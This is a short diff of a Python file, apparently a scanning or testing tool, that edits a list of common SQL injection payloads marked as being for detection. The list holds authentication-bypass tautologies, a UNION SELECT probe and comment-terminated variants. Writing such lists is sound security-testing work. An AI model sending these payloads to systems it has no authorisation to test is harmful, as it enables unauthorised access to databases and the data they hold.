@@ -3,10 +3,10 @@ from urllib.parse import quote
 
 # Common SQL injection payloads for detection
 payloads = [
-    "' OR '1'='1",
+    "' OR '1'='1'--",
     "' UNION SELECT NULL--",
     "' OR 1=1--",
-    "' OR '1'='1' --",
+    "' OR '1'='1'",
     '" OR "1"="1"',
     "' OR 1=1#",
     "' OR ''='",
